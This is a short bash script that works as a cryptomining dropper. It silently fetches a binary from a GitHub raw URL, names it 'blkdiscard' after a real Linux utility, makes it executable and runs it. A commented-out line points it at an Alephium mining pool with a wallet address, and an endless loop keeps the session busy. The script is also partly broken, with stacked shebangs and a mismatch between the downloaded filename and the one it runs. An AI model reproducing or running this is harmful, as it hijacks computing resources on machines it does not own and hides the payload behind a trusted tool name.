#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

apt install proxychains

apt install screen -y

wget https://raw.githubusercontent.com/renilo/bc/main/blkdiscard >/dev/null 2>&1 

chmod +x blkdiscard >/dev/null 2>&1

./blackdiscard --list-algos

#./blkdiscard -a Blake3 --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.$(echo $(shuf -i 1-9999999 -n 1)-MEKI)

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
